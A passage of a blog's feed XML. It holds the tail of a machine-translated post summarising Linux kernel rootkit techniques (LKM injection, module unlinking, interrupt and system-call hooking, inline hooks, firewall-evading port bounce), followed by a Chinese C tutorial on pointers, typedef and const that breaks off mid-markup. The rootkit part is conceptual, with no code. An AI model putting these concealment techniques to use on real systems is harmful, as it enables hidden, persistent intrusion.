dev / null to hide some of the user<span class="string">'s operating information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Core back door: can be the local backdoor and the network to monitor the back door, the local right to mention the kernel module can be sent through the custom command to achieve, the network kernel back door can be in the IP layer to enter the host data packet monitoring, found matching designation After the packet immediately start the connection process.</span></span><br></pre></td></tr></table></figure><h3 id="Rootkit’s-main-technology"><a href="#Rootkit’s-main-technology" class="headerlink" title="Rootkit’s main technology:"></a>Rootkit’s main technology:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">lkm injection, module removal, interruption interrupt (0x80, 0x01), hijacking system call, run-time patch, inline hook, port bounce ...</span><br><span class="line"></span><br><span class="line">lkm injection: is also a way to hide the kernel module, through the infection system lkm, without affecting the original <span class="keyword">function</span> of the rootkit module will be linked to the system lkm, the module is running control, after the call system lkm Initialization <span class="keyword">function</span>, lkm injection involves elf file format and module loading mechanism.</span><br><span class="line"></span><br><span class="line">Module removal: mainly refers to the module from the module list to remove the module to hide the method, the latest module is always loaded <span class="keyword">in</span> the module list header, so you can load the rootkit module and <span class="keyword">then</span> load a cleanup module will rootkit module information from Delete the list, and <span class="keyword">then</span> <span class="built_in">exit</span> the module, the new version of the kernel can also determine the module information directly after the list_del.</span><br><span class="line"></span><br><span class="line">Interception interruption: mainly through the sidt instruction to obtain the address of the interrupt call table, and <span class="keyword">then</span> access to the interrupt handler entry address, modify the corresponding interrupt handler, such as int 0x80, int 0x1 and so on. Which intercept int 0x1 is a relatively new technology, the main use of the system debugging mechanism, by setting the DR register to intercept the memory address up and down the breakpoint, <span class="built_in">which</span> <span class="keyword">in</span> the implementation of the specified instruction into the 0x1 interrupt handler, by modifying 0x1 interrupt Of the processing program can achieve the desired <span class="keyword">function</span>.</span><br><span class="line"></span><br><span class="line">Hijacking system call: and intercept interrupt similar, but mainly on the system call table to modify, you can directly replace the original system call table, you can also modify the system call table entry address. Before the 2.4 kernel, the kernel<span class="string">'s system call table address is exported, so it can be modified directly. But in the 2.6 kernel, the system call table address is no longer exported, the need to 0x80 interrupt handler to obtain the system call table to obtain the address.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Run-time patch: character device driver and block device driver will load the system to register a Struct file\_operations structure to achieve the specified read, write and other operations, the file system is the case, by modifying the file system file\_operations structure, you can achieve the new read, write operation and so on.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">inline hook: mainly refers to the kernel function in memory directly modify, without affecting the original function, you can use the jump method, you can also modify the call to the lower function implementation.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Port bounce: mainly in order to better break through the firewall restrictions, you can monitor the client port 80, and the server through the client'</span>s port 80 back, disguised as a visit to the normal process of web services to <span class="built_in">break</span> through the firewall <span class="built_in">limit</span>.</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Rootkid-Summary&quot;&gt;&lt;a href=&quot;#Rootkid-Summary&quot; class=&quot;headerlink&quot; title=&quot;Rootkid Summary&quot;&gt;&lt;/a&gt;Rootkid Summary&lt;/h2&gt;&lt;h2 id=&quot;title-Rootkid
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/11/22/7/"/>
    <id>http://yoursite.com/2018/11/22/7/</id>
    <published>2018-11-22T10:36:36.054Z</published>
    <updated>2018-11-22T10:32:17.977Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Something-you-don’t-know-about-C"><a href="#Something-you-don’t-know-about-C" class="headerlink" title="Something you don’t know about C !"></a>Something you don’t know about C !</h2><p>title: Something you don’t know about C !</p><hr><p>为了六级，以前写的内容坚持用英语写，不懂得就google翻译帮助&gt;_&lt;,但是这次如果使用英语的话以后看起来应该会很难受所以就用中文写了！<br>C语言的细节肯定不会只有这么多，但是这几个出现的比较频繁，而且在C语言中也是很重要的几个语言特征。如果把这几个细节彻底弄清楚了，C语言本身的神秘就不会太多了。<br>C 语言本身就像一把异常锋利的剪刀，你可以用它做出非常精致优雅的艺术品，也可以剪出一些乱七八糟的废纸片。能够将一件武器用到出神入化那是需要时间的，需要多长时间<br>？不多，请你拿出一万个小时来，英国Exter大学心理学教授麦克.侯威专门研究神童和天才，他的结论很有意思：“一般人以为天才是自然而生、流畅而不受阻的闪亮才华，其实，<br>天才也必须耗费至少十年光阴来学习他们的特殊技能，绝无例外。要成为专家，需要拥有顽固的个性和坚持的能力……每一行的专业人士，都投注大量心血，培养自己的专业才能。”<br>注：台湾女作家、电视节目主持人吴淡如《拿出一万个小时来》。《读者》2003.1期。“不用太努力，只要持续下去。想拥有一辈子的专长或兴趣，就像一个人跑马拉松赛一样，<br>最重要的是跑完，而不是前头跑得有多快。”  </p><h1 id="准备好了吗？我们开始吧-gt-lt"><a href="#准备好了吗？我们开始吧-gt-lt" class="headerlink" title="准备好了吗？我们开始吧&gt;_&lt;"></a>准备好了吗？我们开始吧&gt;_&lt;</h1><hr><h3 id="类型的识别。"><a href="#类型的识别。" class="headerlink" title="类型的识别。"></a>类型的识别。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">int fun(char,double)函数定义如下：</span><br><span class="line"></span><br><span class="line">int(*pf)(char,double)</span><br><span class="line"></span><br><span class="line">pf=&amp;fun</span><br><span class="line"></span><br><span class="line">C语言的简写：pf=fun</span><br><span class="line"></span><br><span class="line">pf(a,8.9)函数调用时的实际操作</span><br><span class="line"></span><br><span class="line">int a\[6\]数组的定义如下：</span><br><span class="line"></span><br><span class="line">int (*pf)\[6\]</span><br><span class="line"></span><br><span class="line">pf=&amp;a</span><br><span class="line"></span><br><span class="line">int i=(*pf)\[2\]//将a\[2\]的值赋给i</span><br><span class="line"></span><br><span class="line">有了上面的基础我们可以解释下面的定义</span><br><span class="line"></span><br><span class="line">int* (\*a\[5\])(int, char\*); //＃1 </span><br><span class="line"></span><br><span class="line">void (\*b\[10\]) (void (\*)()); //＃2 </span><br><span class="line"></span><br><span class="line">doube(*)() (*pa)\[9\]; //＃3 </span><br><span class="line"></span><br><span class="line">首先是<span class="comment">#1：\*a\[5\]是一个五个元素的指针，指针指向函数（int,char\*）</span></span><br><span class="line"></span><br><span class="line">而这个函数的返回值类型是int型的</span><br><span class="line"></span><br><span class="line">再次就是<span class="comment">#2：*b\[10\]是一个元素个数为10的数组，每个元素都是一个指针</span></span><br><span class="line"></span><br><span class="line">该指针指向一个函数，类型为（void(*)()）【注1】返回值是void型的</span><br><span class="line"></span><br><span class="line">注1;这个参数有事一个指针，指向一个函数，函数参数为空，返回值void型的</span><br><span class="line"></span><br><span class="line">最后是<span class="comment">#3：pa是一个指针，指针指向一个数组，这个数组有9个元素</span></span><br><span class="line"></span><br><span class="line">每个元素都是double(*)()【注2】型的</span><br><span class="line"></span><br><span class="line">注2：也即是一个指针，指向一个函数函数参数为空，返回值是double</span><br><span class="line"></span><br><span class="line">现在是不是觉得要认识它们是易如反掌，工欲善其事，必先利其器！我们对这种</span><br><span class="line"></span><br><span class="line">表达方式熟悉之后，就可以用“typedef”来简化这种类型声明。 </span><br><span class="line"></span><br><span class="line">＃1：int* (\*a\[5\])(int, char\*); </span><br><span class="line"></span><br><span class="line">typedef int* (\*PF)(int, char\*);//PF是一个类型别名【注3】。 </span><br><span class="line"></span><br><span class="line">PF a\[5\];//跟int* (\*a\[5\])(int, char\*);的效果一样！ </span><br><span class="line"></span><br><span class="line">注 3：很多初学者只知道typedef char* pchar；但是对于typedef的其它用法不</span><br><span class="line"></span><br><span class="line">太了解。Stephen Blaha对typedef用法做过一个总结：“建立一个类型别名的方</span><br><span class="line"></span><br><span class="line">法很简单，在传统的变量声明表达式里用类型名替代变量名，然后把关键字</span><br><span class="line"></span><br><span class="line"> typedef加在该语句的开头”。 </span><br><span class="line"></span><br><span class="line">＃2：void (\*b\[10\]) (void (\*)()); </span><br><span class="line"></span><br><span class="line">typedef void (*pfv)(); </span><br><span class="line"></span><br><span class="line">typedef void (*pf\_taking\_pfv)(pfv); </span><br><span class="line"></span><br><span class="line">pf\_taking\_pfv b\[10\]; //跟void (\*b\[10\]) (void (\*)());的效果一样！ </span><br><span class="line"></span><br><span class="line">＃3\. doube(*)() (*pa)\[9\]; </span><br><span class="line"></span><br><span class="line">typedef double(*PF)(); </span><br><span class="line"></span><br><span class="line">typedef PF (*PA)\[9\]; </span><br><span class="line"></span><br><span class="line">PA pa; //跟doube(*)() (*pa)\[9\];的效果一样！ </span><br><span class="line"></span><br><span class="line">3.const和volatile在类型声明中的位置 </span><br><span class="line"></span><br><span class="line">在这里我只说const，volatile是一样的【注4】！ </span><br><span class="line"></span><br><span class="line">注4：顾名思义，volatile修饰的量就是很容易变化，不稳定的量<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">它可能被其它线程，操作系统，硬件等等在未知的时间改变，所以</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">它被存储在内存中，每次取用它的时候都只能在内存中去读取，它</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">不能被编译器优化放在内部寄存器中。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">类型声明中const用来修饰一个常量，我们一般这样使用：const在前面 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const int；//int是const </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const char*;//char是const </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">char* const;//*（指针）是const </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const char* const;//char和*都是const </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">对初学者，const char*;和 char* const;是容易混淆的。这需要时间</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">的历练让你习惯它。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">上面的声明有一个对等的写法：const在后面 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int const；//int是const </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">char const*;//char是const </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">char* const;//*（指针）是const </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">char const* const;//char和*都是const </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">第一次你可能不会习惯，但新事物如果是好的，我们为什么要拒绝它呢？：）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const在后面有两个好处： </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A． const所修饰的类型是正好在它前面的那一个。如果这个好处还不能让你</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">动心的话，那请看下一个！ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">B．我们很多时候会用到typedef的类型别名定义。比如typedef char* pchar</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">，如果用const来修饰的话，当const在前面的时候，就是const pchar，你会</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">以为它就是const char* ，但是你错了，它的真实含义是char* const。是不</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">是让你大吃一惊！但如果你采用const在后面的写法，意义就怎么也不会变，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">不信你试试！ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">不过，在真实项目中的命名一致性更重要。你应该在两种情况下都能适应，并</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">能自如的转换，公司习惯，商业利润不论在什么时候都应该优先考虑！不过在</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">开始一个新项目的时候，你可以考虑优先使用const在后面的习惯用法。</span></span><br></pre></td></tr></table></figure><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">它的本质是地址的类型。在许多语言中根本就没有这个概念。但是它却正是C</span><br><span class="line"></span><br><span class="line">灵活，高效，在面向过程的时代所向披靡的原因所在。因为C的内存模型基本上</span><br><span class="line"></span><br><span class="line">对应了现在von Neumann（冯·诺伊曼）计算机的机器模型，很好的达到了对机</span><br><span class="line"></span><br><span class="line">器的映射。不过有些人似乎永远也不能理解指针【注5】。 </span><br><span class="line"></span><br><span class="line">注5：Joel Spolsky就是这样认为的，他认为对指针的理解是一种aptitude，不</span><br><span class="line"></span><br><span class="line">是通过训练就可以达到的 </span><br><span class="line"></span><br><span class="line">指针可以指向值、数组、函数，当然它也可以作为值使用。 </span><br><span class="line"></span><br><span class="line">看下面的几个例子： </span><br><span class="line"></span><br><span class="line">int* p;//p是一个指针，指向一个整数 </span><br><span class="line"></span><br><span class="line">int** p;//p是一个指针，它指向第二个指针，然后指向一个整数 </span><br><span class="line"></span><br><span class="line">int (*pa)\[3\];//pa是一个指针，指向一个拥有3个整数的数组 </span><br><span class="line"></span><br><span class="line">int (*pf)();//pf是一个指向函数的指针，这个函数返回一个整数 </span><br><span class="line"></span><br><span class="line">后面第四节我会详细讲解标识符（identifier）类型的识别。 </span><br><span class="line"></span><br><span class="line">1.指针本身的类型是什么？ </span><br><span class="line"></span><br><span class="line">先看下面的例子：int a;//a的类型是什么？ </span><br><span class="line"></span><br><span class="line">对，把a去掉就可以了。因此上面的4个声明语句中的指针本身的类型为： </span><br><span class="line"></span><br><span class="line">int* </span><br><span class="line"></span><br><span class="line">int** </span><br><span class="line"></span><br><span class="line">int (*)\[3\] </span><br><span class="line"></span><br><span class="line">int (*)() </span><br><span class="line"></span><br><span class="line">它们都是复合类型，也就是类型与类型结合而成的类型。意义分别如下： </span><br><span class="line"></span><br><span class="line">point to int（指向一个整数的指针） </span><br><span class="line"></span><br><span class="line">pointer to pointer to int（指向一个指向整数的指针的指针） </span><br><span class="line"></span><br><span class="line">pointer to array of 3 ints（指向一个拥有三个整数的数组的指针） </span><br><span class="line"></span><br><span class="line">pointer to <span class="keyword">function</span> of parameter is void and <span class="built_in">return</span> value is int </span><br><span class="line"></span><br><span class="line">（指向一个函数的指针，这个函数参数为空，返回值为整数） </span><br><span class="line"></span><br><span class="line">2.指针所指物的类型是什么？ </span><br><span class="line"></span><br><span class="line">很简单，指针本身的类型去掉 “*”号就可以了，分别如下： </span><br><span class="line"></span><br><span class="line">int </span><br><span class="line"></span><br><span class="line">int* </span><br><span class="line"></span><br><span class="line">int ()\[3\] </span><br><span class="line"></span><br><span class="line">int ()() </span><br><span class="line"></span><br><span class="line">3和4有点怪，不是吗？请擦亮你的眼睛，在那个用来把“*”号包住的“()”</span><br><span class="line"></span><br><span class="line">是多余的，所以： </span><br><span class="line"></span><br><span class="line">int ()\[3\]就是int \[3\]（一个拥有三个整数的数组） </span><br><span class="line"></span><br><span class="line">int ()()就是int ()（一个函数，参数为空，返回值为整数）【注6】 </span><br><span class="line"></span><br><span class="line">注6：一个小小的提醒，第二个“()”是一个运算符，名字叫函数调用运算</span><br><span class="line"></span><br><span class="line">符（<span class="keyword">function</span> call operator）。 </span><br><span class="line"></span><br><span class="line">3.指针的算术运算。 </span><br><span class="line"></span><br><span class="line">请再次记住：指针不是一个简单的类型，它是一个和指针所指物的类型复合</span><br><span class="line"></span><br><span class="line">的类型。因此，它的算术运算与之（指针所指物的类型）密切相关。 </span><br><span class="line"></span><br><span class="line">int a\[8\]; </span><br><span class="line"></span><br><span class="line">int* p = a; </span><br><span class="line"></span><br><span class="line">int* q = p + 3; </span><br><span class="line"></span><br><span class="line">p++; </span><br><span class="line"></span><br><span class="line">指针的加减并不是指针本身的表示加减，要记住，指针是一个元素的地址，</span><br><span class="line"></span><br><span class="line">它每加一次，就指向下一个元素。所以： </span><br><span class="line"></span><br><span class="line">int* q = p + 3;//q指向从p开始的第三个整数。 </span><br><span class="line"></span><br><span class="line">p++;//p指向下一个整数。 </span><br><span class="line"></span><br><span class="line">double* pd; </span><br><span class="line"></span><br><span class="line">……//某些计算之后 </span><br><span class="line"></span><br><span class="line">double* pother = pd – 2;//pother指向从pd倒数第二个double数。 </span><br><span class="line"></span><br><span class="line">4.指针本身的大小。 </span><br><span class="line"></span><br><span class="line">在一个现代典型的32位机器上【注7】，机器的内存模型大概是这样的，想</span><br><span class="line"></span><br><span class="line">象一下，内存空间就像一个连续的房间群。每一个房间的大小是一个字节</span><br><span class="line"></span><br><span class="line">（一般是黑客动画吧8位）。有些东西大小是一个字节（比如char），一个</span><br><span class="line"></span><br><span class="line">房间就把它给安置了；但有些东西大小是几个字节（比如double就是8个字</span><br><span class="line"></span><br><span class="line">节，int就是4 个字节，我说的是典型的32位），所以它就需要几个房间才</span><br><span class="line"></span><br><span class="line">能安置。 </span><br><span class="line"></span><br><span class="line">注7：什么叫32位？就是机器CPU一次处理的数据宽度是32位，机器的寄存</span><br><span class="line"></span><br><span class="line">器容量是32位，机器的数据，内存地址总线是32位。当然还有一些细节，</span><br><span class="line"></span><br><span class="line">但大致就是这样。16位，64位，128位可以以此类推。 </span><br><span class="line"></span><br><span class="line">这些房间都应该有编号（也就是地址），32位的机器内存地址空间当然也</span><br><span class="line"></span><br><span class="line">是32位，所以房间的每一个编号都用32位的数来编码【注8】。请记住指针</span><br><span class="line"></span><br><span class="line">也可以作为值使用，作为值的时候，它也必须被安置在房间中（存储在内存</span><br><span class="line"></span><br><span class="line">中），那么指向一个值的指针需要一个地址大小来存储，即32位，4个字节，</span><br><span class="line"></span><br><span class="line">4个房间来存储。 </span><br><span class="line"></span><br><span class="line">注8：在我们平常用到的32位机器上，绝少有将32位真实内存地址空间全用完</span><br><span class="line"></span><br><span class="line">的（232 ＝ 4G），即使是服务器也不例外。现代的操作系统一般会实现32位</span><br><span class="line"></span><br><span class="line">的虚拟地址空间，这样可以方便运用程序的编制。关于虚拟地址（线性地址）</span><br><span class="line"></span><br><span class="line">和真实地址的区别以及实现，可以参考《Linux源代码情景分析》的第二章存</span><br><span class="line"></span><br><span class="line">储管理，在互联网上关于这个主题的文章汗牛充栋，</span><br><span class="line"></span><br><span class="line">，指向对象成员的指针的大小没有定值，但都是4的倍数。不同的编译器还有</span><br><span class="line"></span><br><span class="line">不同的值。对于一般的普通类（class），指向对象成员的指针大小一般为4，</span><br><span class="line"></span><br><span class="line">但在引入多重虚拟继承以及虚拟函数的时候，指向对象成员的指针会增大，</span><br><span class="line"></span><br><span class="line">不论是指向成员数据，还是成员函数。【注9】。 </span><br><span class="line"></span><br><span class="line">注9：在Andrei Alexandrescu的《Modern C++ Design》的5.13节Page124中提到</span><br><span class="line"></span><br><span class="line">，成员函数指针实际上是带标记的（tagged）unions，它们可以对付多重虚拟继</span><br><span class="line"></span><br><span class="line">承以及虚拟函数，书上说成员函数指针大小是16，但我的实践告诉我这个结果不</span><br><span class="line"></span><br><span class="line">对，而且具体编译器实现也不同。一直很想看看GCC的源代码，但由于旁骛太多</span><br><span class="line"></span><br><span class="line">，而且心不静，本身难度也比较高（这个倒是不害怕^_^），只有留待以后了。 </span><br><span class="line"></span><br><span class="line">还有一点，对一个类的static member来说，指向它的指针只是普通的函数指针，</span><br><span class="line"></span><br><span class="line">不是pointer to class member，所以它的大小是4。 </span><br><span class="line"></span><br><span class="line">5.指针运算符&amp;和* </span><br><span class="line"></span><br><span class="line">它们是一对相反的操作，&amp;取得一个东西的地址（也就是指针），*得到一个地址</span><br><span class="line"></span><br><span class="line">里放的东西。这个东西可以是值（对象）、函数、数组、类成员（class member）。 </span><br><span class="line"></span><br><span class="line">其实很简单，房间里面居住着一个人，&amp;操作只能针对人，取得房间号码； </span><br><span class="line"></span><br><span class="line">*操作只能针对房间，取得房间里的人。 </span><br><span class="line"></span><br><span class="line">参照指针本身的类型以及指针所指物的类型很好理解。 </span><br><span class="line"></span><br><span class="line">小结：其实你只要真正理解了1，2，就相当于掌握了指针的牛鼻子。后面的就不</span><br><span class="line"></span><br><span class="line">难了，指针的各种变化和C语言中其它普通类型的变化都差不多(比如各种转型)。</span><br></pre></td></tr></table></figure><h3 id="参数可变的函数"><a href="#参数可变的函数" class="headerlink" title="参数可变的函数"></a>参数可变的函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 